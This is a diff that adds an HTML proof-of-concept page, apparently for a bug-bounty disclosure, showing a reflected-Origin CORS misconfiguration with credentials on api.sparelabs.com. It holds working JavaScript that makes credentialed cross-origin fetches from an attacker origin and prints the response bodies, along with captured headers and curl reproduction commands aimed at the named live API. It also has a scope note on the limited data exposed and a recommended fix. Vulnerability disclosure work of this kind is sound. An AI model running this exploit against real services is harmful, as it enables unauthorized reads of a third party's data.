@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC — api.sparelabs.com: reflected-Origin CORS + credentials (any origin readable)</title>
+<style>
+ body{font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;background:#0f1115;color:#e6edf3;max-width:860px;margin:2rem auto;padding:0 1rem}
+ h1{font-size:1.35rem} h2{font-size:1.05rem;margin-top:2rem}
+ pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.8rem;overflow:auto;font-size:12.5px}
+ .ok{color:#3fb950}.bad{color:#f85149}.dim{color:#8b949e}
+ table{border-collapse:collapse;width:100%}
+ td,th{border:1px solid #30363d;padding:.4rem .6rem;text-align:left;font-size:13px}
+ button{background:#238636;border:0;color:#fff;padding:.45rem .9rem;border-radius:6px;cursor:pointer;margin-right:.4rem}
+ button:disabled{opacity:.5;cursor:wait}
+</style>
+</head>
+<body>
+<h1>api.sparelabs.com — reflected-Origin CORS with credentials</h1>
+<p class="dim">Target: <code>https://api.sparelabs.com/v1</code> · Class: ApiMisconfig CORS · Server reflects ANY Origin + <code>allow-credentials:true</code> + <code>allow-headers:Authorization</code> (no allowlist).</p>
+
+<h2>1. Proof in browser context (this page, hosted on attacker origin genzctf.xyz)</h2>
+<p>This page performs a cross-origin <code>fetch(..., {credentials:"include"})</code> against the target API. With a <b>functional</b> CORS policy these calls must fail (no <code>Access-Control-Allow-Origin</code> for this origin). With the buggy policy they <b>succeed</b> and the server's data is readable from any website.</p>
+<button id="run">Run cross-origin reads</button>
+<pre id="out">idle.</pre>
+
+<h2>2. Preflight/GET header capture (server responses)</h2>
+<pre>OPTIONS /v1/journeys/requests   Origin: https://genzctf.xyz
+Access-Control-Allow-Origin:  <b>https://genzctf.xyz</b>   (reflected, any)
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
+Access-Control-Allow-Headers: Authorization
+
+GET /v1/global/organizations    (no Authorization header at all)
+200  Access-Control-Allow-Origin: <Origin> ; Access-Control-Allow-Credentials: true</pre>
+
+<h2>3. Reproduce (server-side truth, passive)</h2>
+<pre>curl -i -X OPTIONS "https://api.sparelabs.com/v1/journeys/requests" \
+  -H "Origin: https://genzctf.xyz" -H "Access-Control-Request-Method: POST" \
+  -H "Access-Control-Request-Headers: Authorization"
+curl -i "https://api.sparelabs.com/v1/global/organizations" -H "Origin: https://genzctf.xyz"
+curl -i "https://api.sparelabs.com/v1/global/regions" -H "Authorization: Bearer x" -H "Origin: https://genzctf.xyz"</pre>
+
+<p class="dim"><b>Scope note (honesty):</b> data readable cross-origin is platform bootstrap/config; auth is Bearer (SPA) so a victim's <i>authenticated</i> session is not transmitted by the browser today. This finding is a standing misconfiguration: any Origin can perform credentialed reads of every open /v1 route and future cookie-based endpoints are automatically exposed. Recommended fix: replace reflective ACAO with an explicit allowlist and stop emitting <code>allow-credentials:true</code> together with reflection.</p>
+
+<script>
+async function run(){
+  const out=document.getElementById('out');
+  const results=[];
+  const targets=[
+    ["GET /v1/global/regions (with dummy Bearer)","https://api.sparelabs.com/v1/global/regions",{headers:{Authorization:"Bearer x"}}],
+    ["GET /v1/global/organizations (no token)","https://api.sparelabs.com/v1/global/organizations",{}],
+    ["GET /v1/public/organization?organizationId=zero-uuid","https://api.sparelabs.com/v1/public/organization?organizationId=00000000-0000-0000-0000-000000000000",{}]
+  ];
+  document.getElementById('run').disabled=true;
+  for(const [label,url,opts] of targets){
+    try{
+      const r=await fetch(url,{credentials:opts.credentials?"include":"include",...opts});
+      const acao=r.headers.get("access-control-allow-origin");
+      const body=await r.text();
+      results.push(`${label}\n  status=${r.status}  acao=${acao??"(none)"}  len=${body.length}\n  body=${body.slice(0,220)}`);
+    }catch(e){ results.push(`${label}\n  FAILED ${e}`); }
+  }
+  out.textContent=results.join("\n\n");
+}
+document.getElementById('run').addEventListener('click',run);
+</script>
+</body>
+</html>
